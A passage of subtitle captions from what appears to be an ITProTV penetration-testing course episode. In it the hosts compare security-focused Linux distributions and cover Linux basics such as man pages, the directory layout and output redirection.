and\n\n267\n00:12:24.543 --> 00:12:26.190\nuse it as a secondary, right?\n\n268\n00:12:26.190 --> 00:12:28.882\nSo it's a great way to do that,\nplus, you don't have to.\n\n269\n00:12:28.882 --> 00:12:31.640\nYeah, I like doing that,\nto be honest with you.\n\n270\n00:12:31.640 --> 00:12:34.530\nBecause then, if you do something wrong,\nyou just blow away the VM and go,\n\n271\n00:12:34.530 --> 00:12:36.220\nI don't know what you're talking about.\n\n272\n00:12:36.220 --> 00:12:37.639\nNo, I'm kidding,\nyou shouldn't do that, but you could.\n\n273\n00:12:37.639 --> 00:12:39.011\n[LAUGH]\n\n274\n00:12:39.011 --> 00:12:39.782\n&gt;&gt; [LAUGH]\n&gt;&gt; Mike laughs.\n\n275\n00:12:39.782 --> 00:12:43.830\nWe're devious ones around here at ITProTV,\nespecially when it comes to security.\n\n276\n00:12:43.830 --> 00:12:47.680\n&gt;&gt; And I know, as you said,\nOffensive Security, fantastic resource.\n\n277\n00:12:47.680 --> 00:12:52.620\nThey also have some pre-built\nKali VMs that you can download.\n\n278\n00:12:52.620 --> 00:12:57.440\nYou should really get used to installing\na Linux distribution, or running it live.\n\n279\n00:12:57.440 --> 00:12:59.961\nBut also, you could take advantage\nof their pre-built machines.\n\n280\n00:12:59.961 --> 00:13:00.800\n&gt;&gt; Yeah, totally, totally.\n\n281\n00:13:00.800 --> 00:13:02.550\nThey've got, they're a great resource, so\n\n282\n00:13:02.550 --> 00:13:06.200\nkick your feet around on kali.org and\nsee what you find.\n\n283\n00:13:06.200 --> 00:13:10.297\nDefinitely download the VM, especially if\nyou're gonna be following along with us,\n\n284\n00:13:10.297 --> 00:13:11.933\nso that you can use the same tools.\n\n285\n00:13:11.933 --> 00:13:13.930\nIt's basically configured the same way.\n\n286\n00:13:13.930 --> 00:13:16.460\nNot that the other distributions won't do\nthat, I just can't guarantee that they'll\n\n287\n00:13:16.460 --> 00:13:19.550\nbe there, because I'm using Kali for\nthe show.\n\n288\n00:13:19.550 --> 00:13:20.680\nSpeaking of, the other tools.\n\n289\n00:13:20.680 --> 00:13:24.380\n&gt;&gt; Yeah, I was gonna say, now, we\nobviously are maybe a little bit partial.\n\n290\n00:13:24.380 --> 00:13:27.700\nBut there are other Linux distributions\nthat are geared for this as well.\n\n291\n00:13:27.700 --> 00:13:29.806\n&gt;&gt; Yeah, totally,\nthey're not the only fish in the sea.\n\n292\n00:13:29.806 --> 00:13:32.691\nSo if Kali is not your thing, maybe you\nwant something else you wanna try, or\n\n293\n00:13:32.691 --> 00:13:33.876\nyou just wanna try the others.\n\n294\n00:13:33.876 --> 00:13:35.540\nI know I do.\n\n295\n00:13:35.540 --> 00:13:36.120\nI like to play.\n\n296\n00:13:36.120 --> 00:13:37.408\nI like to see what they'll do.\n\n297\n00:13:37.408 --> 00:13:42.256\nThat's really the mindset that you have to\nhave when it comes to, let's be honest,\n\n298\n00:13:42.256 --> 00:13:44.527\nhacking, that's what we're doing.\n\n299\n00:13:44.527 --> 00:13:46.190\nWe're gonna be hacking computers.\n\n300\n00:13:46.190 --> 00:13:46.950\nYou are a hacker.\n\n301\n00:13:46.950 --> 00:13:50.220\nIf you are into this, you're a hacker,\nthat's the way you think.\n\n302\n00:13:50.220 --> 00:13:53.692\nAnd if you are a hacker,\nthat's exactly what you're gonna be doing.\n\n303\n00:13:53.692 --> 00:13:56.290\nYou wanna play with any new thing\nthat comes down the pipe and\n\n304\n00:13:56.290 --> 00:13:57.080\nsee what you can do with it.\n\n305\n00:13:57.080 --> 00:14:01.080\nSee what it's supposed to do, see what you\ncan make it do, that's the whole idea.\n\n306\n00:14:01.080 --> 00:14:06.430\nSo don't dismiss these just because\nthey're not the one that's used mostly.\n\n307\n00:14:06.430 --> 00:14:08.090\nDownload it, maybe you'll be like, man!\n\n308\n00:14:09.160 --> 00:14:10.980\nSo the next one is BlackArch, right?\n\n309\n00:14:10.980 --> 00:14:12.900\nBlackArch, it's an Arch Linux.\n\n310\n00:14:12.900 --> 00:14:16.890\nIf you like Arch Linux,\nmaybe BlackArch is your way to go.\n\n311\n00:14:16.890 --> 00:14:20.080\nIt's a specific pen testing\ndistribution with a bunch of pre-built\n\n312\n00:14:20.080 --> 00:14:24.470\ntools already baked in,\nso that you can use that.\n\n313\n00:14:24.470 --> 00:14:27.160\nAnd you're an Arch Linux guy,\nnot a problem.\n\n314\n00:14:27.160 --> 00:14:29.790\nLet's check out their resources just\nto see what they're offering here.\n\n315\n00:14:29.790 --> 00:14:33.730\nLet's do a little Google search for\nBlackArch Linux.\n\n316\n00:14:33.730 --> 00:14:37.509\nThere we go, there we go, blackarch.org.\n\n317\n00:14:37.509 --> 00:14:40.595\nAnd of course I'm getting this\nSecure Connection Failed.\n\n318\n00:14:40.595 --> 00:14:42.173\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't know why.\n\n319\n00:14:42.173 --> 00:14:46.190\nLet's just try again and\nsee if it gives me an error.\n\n320\n00:14:46.190 --> 00:14:49.208\nYeah, maybe I can go to their\ncached page and get around this.\n\n321\n00:14:49.208 --> 00:14:53.537\nThere we go, there we go,\na little defunct-looking there, but\n\n322\n00:14:53.537 --> 00:14:55.044\nwhatever, it works.\n\n323\n00:14:55.044 --> 00:14:59.130\nI'm just trying to initiate you to what\nis out there and available for you.\n\n324\n00:14:59.130 --> 00:15:03.802\nSo there you go, you can, I like this,\nhas a different front end, so\n\n325\n00:15:03.802 --> 00:15:09.540\nflexbox, openbox, lxdm, very cool,\na lot of information around here.\n\n326\n00:15:09.540 --> 00:15:11.631\nI don't know why I'm getting\na security problem with this,\n\n327\n00:15:11.631 --> 00:15:13.897\nbut maybe their security\ncertificate's expired or something.\n\n328\n00:15:13.897 --> 00:15:15.240\n&gt;&gt; Probably.\n\n329\n00:15:15.240 --> 00:15:17.170\n&gt;&gt; That does happen from time to time.\n\n330\n00:15:17.170 --> 00:15:18.620\nAnyway, yeah, check out BlackArch.\n\n331\n00:15:18.620 --> 00:15:21.100\nSo if you're an Arch Linux fan,\nthere's BlackArch.\n\n332\n00:15:21.100 --> 00:15:26.570\nThere's also Black Box and\nFedora Security Spin.\n\n333\n00:15:26.570 --> 00:15:27.444\n&gt;&gt; Hm.\n&gt;&gt; All right, so Fedora,\n\n334\n00:15:27.444 --> 00:15:28.798\nthey're throwing their hat in the ring.\n\n335\n00:15:28.798 --> 00:15:30.183\n&gt;&gt; [LAUGH]\n&gt;&gt; [SOUND], right?\n\n336\n00:15:30.183 --> 00:15:32.270\nPun intended.\n\n337\n00:15:32.270 --> 00:15:35.050\nWith the penetration testing, because\nthey realized there are people out there,\n\n338\n00:15:35.050 --> 00:15:35.930\nand guess what?\n\n339\n00:15:35.930 --> 00:15:39.330\nThey run Red Hat Enterprise Linux,\nand they go.\n\n340\n00:15:39.330 --> 00:15:40.300\nOr they're running Fedora,\n\n341\n00:15:40.300 --> 00:15:44.590\nbecause that Fedora is like their\nbleeding edge version of Red Hat.\n\n342\n00:15:45.770 --> 00:15:48.220\nAnd I wanna use that, and\nI wanna have every tool installed.\n\n343\n00:15:48.220 --> 00:15:51.830\nI wanna be prepared to do some\npen testing in my environment.\n\n344\n00:15:51.830 --> 00:15:53.847\nAnd I don't wanna have to,\ncuz let me tell you what, I've done it.\n\n345\n00:15:53.847 --> 00:15:56.662\nI've multiple times, typically,\n\n346\n00:15:56.662 --> 00:16:01.486\nmy Linux distributions become\npenetration testing systems.\n\n347\n00:16:01.486 --> 00:16:06.177\nBecause I used the tools that are built\nin for administrative purposes, right?\n\n348\n00:16:07.200 --> 00:16:11.830\nJust because a tool is a hacker tool\nper se, typically, that's not the case.\n\n349\n00:16:11.830 --> 00:16:14.620\nTypically, the tool is\nmeant to be administrative.\n\n350\n00:16:14.620 --> 00:16:20.601\nAnd you can use it to do things that would\nlead you down the road to the dark side.\n\n351\n00:16:20.601 --> 00:16:22.435\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] So, and\n\n352\n00:16:22.435 --> 00:16:23.790\nthat's what happens, right?\n\n353\n00:16:23.790 --> 00:16:25.400\nnmaps is a fantastic example.\n\n354\n00:16:25.400 --> 00:16:26.840\nWe'll talk about nmap a little more.\n\n355\n00:16:26.840 --> 00:16:28.920\nJust meant to map networks out.\n\n356\n00:16:28.920 --> 00:16:32.144\nWell, what's on my network,\nwhere the hell, let's do some of that.\n\n357\n00:16:32.144 --> 00:16:35.234\nAnd then someone said, it tells me what\nmachines are on this network, what they\n\n358\n00:16:35.234 --> 00:16:38.385\nare, what they're doing, what services\nthey're, okay, that sounds good to me.\n\n359\n00:16:38.385 --> 00:16:40.400\nIt's all about information, right?\n\n360\n00:16:40.400 --> 00:16:41.290\nSo, there you go.\n\n361\n00:16:41.290 --> 00:16:42.789\nThat's the kind of thing that happens.\n\n362\n00:16:42.789 --> 00:16:45.350\nLet's, to be fair to\nthe other distributions,\n\n363\n00:16:45.350 --> 00:16:47.290\nwe'll go to their websites as well.\n\n364\n00:16:47.290 --> 00:16:49.860\nLet's look up Fedora cuz\nI'm interested in that.\n\n365\n00:16:49.860 --> 00:16:50.778\nI haven't played with it yet.\n\n366\n00:16:50.778 --> 00:16:55.690\nFedora security spin.\n\n367\n00:16:55.690 --> 00:16:57.842\nThere it is.\nSecurity lab, Fedora,\n\n368\n00:16:57.842 --> 00:16:59.934\nI think this is probably it.\n\n369\n00:16:59.934 --> 00:17:00.640\nThere we go.\n\n370\n00:17:00.640 --> 00:17:04.554\nProvides a safe test environment to work\non security auditing, forensics, and\n\n371\n00:17:04.554 --> 00:17:08.421\nsystem rescue and teaching security\ntesting methodologies in universities.\n\n372\n00:17:08.421 --> 00:17:11.490\nSo look at that,\nit's used by higher learning, all that.\n\n373\n00:17:11.490 --> 00:17:13.910\nEverybody isn't,\nthere you big fat download button.\n\n374\n00:17:13.910 --> 00:17:15.900\nClick that download and\nget it operated, right?\n\n375\n00:17:15.900 --> 00:17:17.230\nVery cool.\n\n376\n00:17:17.230 --> 00:17:21.219\nAnd then, of course, we'll do black box\nas well just to see what that looks like.\n\n377\n00:17:21.219 --> 00:17:22.740\nBlackbox Linux.\n\n378\n00:17:24.980 --> 00:17:28.180\nThere we go, a free open source\ncommunity project, how about that.\n\n379\n00:17:28.180 --> 00:17:30.460\nIt's a nice website they got here.\n\n380\n00:17:31.570 --> 00:17:32.582\nWhat is it?\n\n381\n00:17:32.582 --> 00:17:33.520\nMore than operating system,\n\n382\n00:17:33.520 --> 00:17:37.390\na free open source community project aimed\nto promote the culture of security and IT.\n\n383\n00:17:37.390 --> 00:17:41.100\nSo, definitely download all of these,\nI would say.\n\n384\n00:17:41.100 --> 00:17:44.480\nRun them in a VM, see how you like it,\ntake them for a test drive.\n\n385\n00:17:44.480 --> 00:17:45.420\nAnd pick the one you like the best.\n\n386\n00:17:45.420 --> 00:17:48.940\nIf you're following along with me, again,\nI can't guarantee any of the other threes.\n\n387\n00:17:48.940 --> 00:17:53.660\nThen, Cali will work it or\nhave the tool installed, should I say?\n\n388\n00:17:53.660 --> 00:17:57.320\nBut you can fix that by\ninstalling that tool yourself.\n\n389\n00:17:57.320 --> 00:17:58.380\nSo let's move on.\n\n390\n00:17:58.380 --> 00:17:59.040\nWhere are we at?\n\n391\n00:17:59.040 --> 00:18:01.118\nLet's talk Linux basics.\n\n392\n00:18:01.118 --> 00:18:05.490\nSo I'm gonna give you just a hint of\na primer, if it were on the Linux.\n\n393\n00:18:05.490 --> 00:18:09.910\nNot how to do them necessarily,\nbut what you should know so\n\n394\n00:18:09.910 --> 00:18:11.800\nthat we can continue on.\n\n395\n00:18:11.800 --> 00:18:13.710\nThat's the disclaimer here.\n\n396\n00:18:13.710 --> 00:18:16.000\nThis is things that you\nshould be able to do.\n\n397\n00:18:17.030 --> 00:18:18.611\nSo that you can be\nan effective pen tester.\n\n398\n00:18:18.611 --> 00:18:22.924\n&gt;&gt; So in other words, as we go through\nthese, this might be a good time to watch\n\n399\n00:18:22.924 --> 00:18:27.460\nthis, and if any these you're not\nfamiliar with or can't do easily, pause.\n\n400\n00:18:27.460 --> 00:18:30.310\nTake a minute and\nbrush up on those skills.\n\n401\n00:18:30.310 --> 00:18:34.560\nCuz as we go through these episodes, we're\njust gonna be assuming that you understand\n\n402\n00:18:34.560 --> 00:18:36.520\nhow to grip something,\nhow to set something.\n\n403\n00:18:36.520 --> 00:18:38.993\n&gt;&gt; Yeah, Mike,\nagain gold star over here, right?\n\n404\n00:18:38.993 --> 00:18:42.596\nHe's a mastermind, he knows, because\nhe's kind of been through it once or\n\n405\n00:18:42.596 --> 00:18:45.316\ntwice his own self that you\ngot to have a good foundation.\n\n406\n00:18:45.316 --> 00:18:47.606\nIf you're gonna work on\nan operating system,\n\n407\n00:18:47.606 --> 00:18:51.247\nespecially doing something as complex\nas security testing, well hell,\n\n408\n00:18:51.247 --> 00:18:54.960\nyou probably better have a pretty\ngood mind of what's behind the wheel.\n\n409\n00:18:54.960 --> 00:18:57.857\nSo that's what I wanna make sure\nthat you guys are aware of, so\n\n410\n00:18:57.857 --> 00:19:01.645\nif you're weak on any of these one things,\nread the man page, go to the website,\n\n411\n00:19:01.645 --> 00:19:04.568\nwhatever the case is, and\nlearn that at least functionally.\n\n412\n00:19:04.568 --> 00:19:07.731\nAt least be able to get to the man page,\nto be honest with you, and, well,\n\n413\n00:19:07.731 --> 00:19:09.030\nlet's start there.\n\n414\n00:19:09.030 --> 00:19:11.484\nKnow how to do a man page manual, right?\n\n415\n00:19:11.484 --> 00:19:13.190\nThe manual four.\n\n416\n00:19:13.190 --> 00:19:14.900\nIf you have a tool,\nyou don't know how it works,\n\n417\n00:19:14.900 --> 00:19:17.480\nthere's usually a manual installed for it.\n\n418\n00:19:17.480 --> 00:19:20.780\nSo you just do man tool name,\nand something comes up.\n\n419\n00:19:20.780 --> 00:19:22.136\nLet's show you what that looks like,\nright?\n\n420\n00:19:22.136 --> 00:19:23.130\nReally quickly.\n\n421\n00:19:23.130 --> 00:19:25.730\nGot my little command line open here.\n\n422\n00:19:25.730 --> 00:19:28.307\nAll I have to do is do man like DIRB,\nright?\n\n423\n00:19:29.640 --> 00:19:32.040\nDIRB is a Web Content Scanner.\n\n424\n00:19:32.040 --> 00:19:34.540\nIf I never knew how to\nuse DIRB in my life,\n\n425\n00:19:34.540 --> 00:19:36.190\nthere's the manual for it, right there.\n\n426\n00:19:36.190 --> 00:19:43.310\nTypically, you can also kind of do like\na help thing, where you do like dirb-help.\n\n427\n00:19:43.310 --> 00:19:45.991\nI actually know that dirb does not have\na help file, to be honest with you,\n\n428\n00:19:45.991 --> 00:19:47.563\n[LAUGH] you'll see that\nit just goes crazy.\n\n429\n00:19:47.563 --> 00:19:51.700\nIt says fatal, you're gonna die\nbecause I didn't do anything.\n\n430\n00:19:51.700 --> 00:19:52.780\nBut no, you're not gonna die.\n\n431\n00:19:52.780 --> 00:19:54.980\nIt's just letting you know,\nthere is no help file.\n\n432\n00:19:54.980 --> 00:19:57.010\nThe man file is the help file for dirb.\n\n433\n00:19:57.010 --> 00:20:02.875\nBut any other thing, man, nmap,\nor I can just do nmap--help.\n\n434\n00:20:02.875 --> 00:20:04.290\nYou see, it gives you help.\n\n435\n00:20:04.290 --> 00:20:06.220\nRight?\nSo, let me clear that screen out.\n\n436\n00:20:07.430 --> 00:20:09.030\nLet's see here.\n\n437\n00:20:09.030 --> 00:20:11.180\nFile structure and directory traversal.\n\n438\n00:20:11.180 --> 00:20:12.035\nThis is basic stuff, right?\n\n439\n00:20:12.035 --> 00:20:13.660\nLinux 101.\n\n440\n00:20:13.660 --> 00:20:16.910\nWhat's in the file, where are things?\n\n441\n00:20:16.910 --> 00:20:17.775\nDefinitely got to know that.\n\n442\n00:20:17.775 --> 00:20:20.120\nYou got to know you're way\naround Linux pretty well.\n\n443\n00:20:20.120 --> 00:20:21.630\nWhere do I keep all my executables?\n\n444\n00:20:21.630 --> 00:20:24.560\nWhere are my games so I can play\nSolitaire when I'm not doing anything or\n\n445\n00:20:24.560 --> 00:20:25.990\nI'm waiting for a scan to complete?\n\n446\n00:20:25.990 --> 00:20:27.710\nThat's extremely important.\n\n447\n00:20:27.710 --> 00:20:28.390\nYeah, absolutely.\n\n448\n00:20:28.390 --> 00:20:30.631\nIf you don't know that,\nthat's the first thing you should learn.\n\n449\n00:20:30.631 --> 00:20:33.213\nWhere the heck are my games, right?\n\n450\n00:20:33.213 --> 00:20:35.790\n[LAUGH] So let's take a look at\nthe final structure really quickly.\n\n451\n00:20:35.790 --> 00:20:39.750\nIf I do a cd..back to the,\nactually a cd /, like that.\n\n452\n00:20:39.750 --> 00:20:41.524\nSlash is the root system, right?\n\n453\n00:20:41.524 --> 00:20:44.270\nThe top of the tree,\nthe hierarchy as it were.\n\n454\n00:20:44.270 --> 00:20:47.510\nEven though it's kinda weird,\nit's a root, I think bottom.\n\n455\n00:20:47.510 --> 00:20:49.395\nAnyway, so where It all begins, right?\n\n456\n00:20:49.395 --> 00:20:54.364\nAnd if I do an ls to list the directories,\nor if I do an ls- la, like that,\n\n457\n00:20:54.364 --> 00:20:59.667\nyou can start to see some more information\nabout it and basically list it out.\n\n458\n00:20:59.667 --> 00:21:03.572\nA lot of times I'll make an alias for\nls, to be honest with you,\n\n459\n00:21:03.572 --> 00:21:07.190\nbecause a lot of times you\nwant this information.\n\n460\n00:21:07.190 --> 00:21:09.210\nSo it's just easier to make an alias,\n\n461\n00:21:09.210 --> 00:21:13.507\nsay alias equals ls, equals whatever,\nmake it do what you wanna do.\n\n462\n00:21:14.980 --> 00:21:17.460\nBut this is our basic\nLinux directory structure.\n\n463\n00:21:17.460 --> 00:21:19.150\nYou need to know things like var.\n\n464\n00:21:20.285 --> 00:21:22.890\nThat's where logs are capture inside var,\nso\n\n465\n00:21:22.890 --> 00:21:27.890\nthere's var log, that's where Apache,\nif you're running Apache as a web server.\n\n466\n00:21:27.890 --> 00:21:33.365\nThat's where its webroot is,\nwhere you put your index.html,\n\n467\n00:21:33.365 --> 00:21:39.570\nso that when you go to mycoolwebsite.com,\nor whatever it is you wanna call it, and\n\n468\n00:21:39.570 --> 00:21:44.100\nit shows you that first page, that's\nwhere it goes, so you got to know that.\n\n469\n00:21:44.100 --> 00:21:45.665\nMike, what's some other good ones?\n\n470\n00:21:45.665 --> 00:21:46.412\n[LAUGH].\n\n471\n00:21:46.412 --> 00:21:46.923\n&gt;&gt; You ask me.\n\n472\n00:21:46.923 --> 00:21:48.400\nUSR, I think.\n\n473\n00:21:48.400 --> 00:21:48.931\n&gt;&gt; Yeah.\n\n474\n00:21:48.931 --> 00:21:51.160\nAnd then those Bin folders are important.\n\n475\n00:21:51.160 --> 00:21:52.250\n&gt;&gt; Yeah, Bin is great, right?\n\n476\n00:21:52.250 --> 00:21:53.345\nBin is where all your binaries are.\n\n477\n00:21:53.345 --> 00:21:54.450\nThere is sbin.\n\n478\n00:21:54.450 --> 00:21:55.020\nThere is bin.\n\n479\n00:21:55.020 --> 00:21:58.310\nThere's /usr/local/bin.\n\n480\n00:21:58.310 --> 00:22:01.260\n/usr/local/sbin, /usr/bin, /usr/sbin.\n\n481\n00:22:01.260 --> 00:22:03.080\nThere's a lot of them around there.\n\n482\n00:22:03.080 --> 00:22:06.610\nTypically though, like sbin and\nbin are the main ones, and\n\n483\n00:22:06.610 --> 00:22:10.580\nthose user local ones are gonna be-\n&gt;&gt; I found it as a primarily a Windows\n\n484\n00:22:10.580 --> 00:22:14.730\nguy, I found this was one of the biggest\nhurdles that I had to face was\n\n485\n00:22:14.730 --> 00:22:16.480\ngetting comfortable with the file system,\n\n486\n00:22:16.480 --> 00:22:19.420\nknowing where things are gonna be put,\nwhere to expect them.\n\n487\n00:22:19.420 --> 00:22:23.470\nSo do spend a little time here, because\nit will make your life in the Linux world\n\n488\n00:22:23.470 --> 00:22:28.500\na whole lot easier If you understand\nthe way that file system is structured and\n\n489\n00:22:28.500 --> 00:22:30.160\nwhere it's putting things.\n\n490\n00:22:30.160 --> 00:22:32.390\n&gt;&gt; Yeah.\n&gt;&gt; And understanding where you're at\n\n491\n00:22:32.390 --> 00:22:35.030\nin the file system, unlike say,\nFile Explorer in Windows,\n\n492\n00:22:35.030 --> 00:22:38.040\nwhere it's very obvious and\nyou get that path up there.\n\n493\n00:22:38.040 --> 00:22:41.159\nSometimes in Linux it can be a little more\ndifficult to figure out where you are.\n\n494\n00:22:41.159 --> 00:22:41.741\n&gt;&gt; Yeah.\n\n495\n00:22:41.741 --> 00:22:43.216\nThere are graphical sides to this thing.\n\n496\n00:22:43.216 --> 00:22:47.778\nAll right, there's a file explorer\nhere that I could fire up and that,\n\n497\n00:22:47.778 --> 00:22:48.700\nthere you go.\n\n498\n00:22:48.700 --> 00:22:51.730\nThere's a little more Windows E,\nso that can be helpful.\n\n499\n00:22:51.730 --> 00:22:54.020\nYou'll notice I'm in my Home Directory.\n\n500\n00:22:54.020 --> 00:22:55.774\nWhat's my Home Directory?\n\n501\n00:22:55.774 --> 00:22:56.958\nAll right, see, gotcha.\n\n502\n00:22:56.958 --> 00:23:00.470\nYou got to know a little more about\nLinux cuz they assume some knowledge.\n\n503\n00:23:00.470 --> 00:23:02.830\nSo, let's talk about the home\ndirectory really quickly.\n\n504\n00:23:02.830 --> 00:23:03.460\nYeah, that's a good one.\n\n505\n00:23:05.650 --> 00:23:09.210\nWhere is /home, there you are, /home.\n\n506\n00:23:09.210 --> 00:23:11.780\nThat's typically if you\nhave a user on a system.\n\n507\n00:23:11.780 --> 00:23:14.290\nThey get their own directory, so\nthey could place their own files.\n\n508\n00:23:14.290 --> 00:23:15.240\nJust like you do on Windows.\n\n509\n00:23:15.240 --> 00:23:16.810\nYou have a profile or whatever.\n\n510\n00:23:16.810 --> 00:23:17.650\nSame kind of idea.\n\n511\n00:23:18.780 --> 00:23:20.438\nCuz they're gonna be on a /home directory.\n\n512\n00:23:20.438 --> 00:23:23.960\nSo if you got multiple users,\nyou know that their home directory's gonna\n\n513\n00:23:23.960 --> 00:23:28.265\nbe in /home/mrodrick/dlowrie/kittenface,\n\n514\n00:23:28.265 --> 00:23:31.070\nor whatever you're called\non your Linux distribution.\n\n515\n00:23:32.250 --> 00:23:35.460\nAnother really,\nreally good one is Etsy here.\n\n516\n00:23:35.460 --> 00:23:39.888\nConfiguration files,\nsystem startup scripts, system stuff,\n\n517\n00:23:39.888 --> 00:23:43.679\nspecifically, do I wanna give\naway the ghost just yet?\n\n518\n00:23:43.679 --> 00:23:44.240\n&gt;&gt; Not yet.\n\n519\n00:23:44.240 --> 00:23:45.835\n&gt;&gt; Nah, we'll save that, we'll save that.\n\n520\n00:23:45.835 --> 00:23:48.730\n&gt;&gt; [LAUGH]\n&gt;&gt; Just tease you a little bit, right?\n\n521\n00:23:48.730 --> 00:23:50.155\nSome really good stuff in there, right?\n\n522\n00:23:50.155 --> 00:23:53.232\nSo get comfortable inside of SE,\nyou'll be there a lot.\n\n523\n00:23:53.232 --> 00:23:57.811\nThere was one more I thought was good,\nwhich one was it?\n\n524\n00:23:57.811 --> 00:24:00.741\nHome, the root directory itself, duh.\n\n525\n00:24:00.741 --> 00:24:01.937\nWhere am I?\n\n526\n00:24:01.937 --> 00:24:07.330\n/root, not root, not the root directory,\nbut root's directory.\n\n527\n00:24:07.330 --> 00:24:10.070\nThis is a very, [LAUGH] understand\nthe difference between the two.\n\n528\n00:24:10.070 --> 00:24:13.461\nThat's what you need to know, that /root,\n\n529\n00:24:13.461 --> 00:24:17.580\nnot just /, but /root,\nis root's home directory.\n\n530\n00:24:17.580 --> 00:24:19.073\nIt's not found on the home directory.\n\n531\n00:24:19.073 --> 00:24:22.779\nAnd only root can access it or if you have\nappropriate permissions you can get into\n\n532\n00:24:22.779 --> 00:24:26.560\nthe root file or the root folder,\nthe home directory should I say.\n\n533\n00:24:26.560 --> 00:24:28.820\nSo, yeah, I know,\na little bit of twisties.\n\n534\n00:24:28.820 --> 00:24:32.230\n&gt;&gt; It really is a little bit weird, and\nso let me see if I can decipher that for\n\n535\n00:24:32.230 --> 00:24:33.650\nus Windows people out there.\n\n536\n00:24:33.650 --> 00:24:36.871\nThere's root which is the top\nof the file structure but\n\n537\n00:24:36.871 --> 00:24:41.773\nthen there's also root which is the root\nuser's directory where his documents and\n\n538\n00:24:41.773 --> 00:24:44.938\nthings go to his or her,\nwhoever is logged in as root.\n\n539\n00:24:44.938 --> 00:24:48.965\nSo that's the difference there when you\ntalk about root, you could be talking\n\n540\n00:24:48.965 --> 00:24:53.008\nabout the root of the file system itself,\nor the super user, the super admin.\n\n541\n00:24:53.008 --> 00:24:57.170\nWell, he has a personal directory just\nlike any other user on the system.\n\n542\n00:24:57.170 --> 00:24:59.970\n&gt;&gt; That's it, all right, so\nlet's move through this directory.\n\n543\n00:24:59.970 --> 00:25:01.080\nWhat if I wanted to get in?\n\n544\n00:25:01.080 --> 00:25:03.660\nHow do I get from one\ndirectory to another?\n\n545\n00:25:03.660 --> 00:25:05.210\nReally simple to use the cd.\n\n546\n00:25:05.210 --> 00:25:08.000\nSo if you're coming from a Windows,\nthis should be very similar.\n\n547\n00:25:08.000 --> 00:25:10.800\nA lot of the stuff like\nmaking directories, mkdir,\n\n548\n00:25:10.800 --> 00:25:15.000\nI think that's the same if not\nsimilar in Windows environments.\n\n549\n00:25:15.000 --> 00:25:18.270\nSo if you have some Windows\ncommand line knowledge,\n\n550\n00:25:18.270 --> 00:25:22.080\nyou should be able to take\na lot of that and pump it over.\n\n551\n00:25:22.080 --> 00:25:24.710\nNot all that.\nIt's actually gonna go well beyond,\n\n552\n00:25:24.710 --> 00:25:26.445\nat least the command line portion.\n\n553\n00:25:26.445 --> 00:25:31.520\nPowerScript, or PowerShell and\nmaybe the old VB scripting and\n\n554\n00:25:31.520 --> 00:25:35.590\nstuff is a little more in-depth than\ncommand line inside of Windows.\n\n555\n00:25:35.590 --> 00:25:40.000\nBut For Linux, you just have the command\nline, and it's all right there.\n\n556\n00:25:40.000 --> 00:25:41.560\nIt's all built into that bash environment.\n\n557\n00:25:42.610 --> 00:25:47.420\nSo let's do that, let's just change\ninto cd /home, like that, all right, and\n\n558\n00:25:47.420 --> 00:25:49.790\nnow I'm in the home directory.\n\n559\n00:25:49.790 --> 00:25:50.690\nVery, very simple.\n\n560\n00:25:50.690 --> 00:25:53.720\nIf I wanna back out, cd There you go.\n\n561\n00:25:53.720 --> 00:25:58.250\nI've moved one directory up, or\ndown, or however you think about it.\n\n562\n00:25:58.250 --> 00:26:02.290\nLet’s go into manipulating output.\n\n563\n00:26:02.290 --> 00:26:04.378\nCuz you're gonna do this a lot.\n\n564\n00:26:04.378 --> 00:26:07.720\nYou're gonna be sending\nthe output of one program, or\n\n565\n00:26:07.720 --> 00:26:10.560\nfile, or\nwhatever into the input of another.\n\n566\n00:26:10.560 --> 00:26:12.520\nYou're gonna be sending it to a file.\n\n567\n00:26:12.520 --> 00:26:16.130\nMaybe you're gonna look at\nthe contents of one file, and\n\n568\n00:26:16.130 --> 00:26:18.670\nsend that into another file, right?\n\n569\n00:26:18.670 --> 00:26:19.940\nThese are things you're gonna be doing.\n\n570\n00:26:19.940 --> 00:26:22.380\nYou have a few operands\nthat can help you do that.\n\n571\n00:26:22.380 --> 00:26:24.210\nThe greater than signs or\nthe less than sign.\n\n572\n00:26:24.210 --> 00:26:26.560\nTypically it's gonna be\nthe greater than sign.\n\n573\n00:26:26.560 --> 00:26:28.090\nSometimes it'll be the less than sign, so.\n\n574\n00:26:28.090 --> 00:26:29.880\nLet's show you how to\ndo that really quickly.\n\n575\n00:26:29.880 --> 00:26:32.530\nI can do things like, let's see here.\n\n576\n00:26:32.530 --> 00:26:33.974\nLet me get back into /root.\n\n577\n00:26:35.120 --> 00:26:37.478\nAnd say, like, echo.\n\n578\n00:26:39.077 --> 00:26:44.523\nThis is a great file, and\nthen redirect that into superfile1.txt,\n\n579\n00:26:44.523 --> 00:26:50.360\nand you can give it any extension,\nLinux doesn't care, and there you go.\n\n580\n00:26:50.360 --> 00:26:55.132\nNow I can cat superfile1.txt, and\nthis is, this is a great file.\n\n581\n00:26:55.132 --> 00:27:00.520\nSo I've redirected the output of\necho into a file and saved it.\n\n582\n00:27:00.520 --> 00:27:05.620\nI do that a lot when it comes to\nmy command line like scanners or\n\n583\n00:27:05.620 --> 00:27:07.620\nthings when they create output.\n\n584\n00:27:07.620 --> 00:27:12.540\nTypically all these thing have an output\noption but there is a million of them.\n\n585\n00:27:12.540 --> 00:27:17.030\nYeah there is not it's easier just for me\nto go while greater than file name, right,\n\n586\n00:27:17.030 --> 00:27:18.680\nI know that will work.\n\n587\n00:27:18.680 --> 00:27:20.080\nAnd I don't have to learn another option.\n\n588\n00:27:20.080 --> 00:27:22.440\nSo that's typically what I'll do.\n\n589\n00:27:22.440 --> 00:27:23.690\nThat way I can go back later.\n\n590\n00:27:23.690 --> 00:27:24.910\nTake a look at that output.\n\n591\n00:27:24.910 --> 00:27:25.610\nPeruse through it.\n\n592\n00:27:25.610 --> 00:27:27.260\nIt's saved as a flat file.\n\n593\n00:27:27.260 --> 00:27:27.860\nIt's super easy.\n\n594\n00:27:27.860 --> 00:27:31.220\nJust whip out your text editor if you\nwanna make changes to it and there you go.\n\n595\n00:27:31.220 --> 00:27:32.590\nThere's like information.\n\n596\n00:27:32.590 --> 00:27:36.760\nThat's probably one of the biggest keys as\nwe're starting about penetration testing.\n\n597\n00:27:36.760 --> 00:27:37.980\nKeep things in order, right.\n\n598\n00:27:37.980 --> 00:27:42.370\nYou wanna have an order in which you\ndo things, not just haphazardly,\n\n599\n00:27:42.370 --> 00:27:45.620\nthrowing everything and the kitchen\nsink at it and hope something sticks.\n\n600\n00:27:45.620 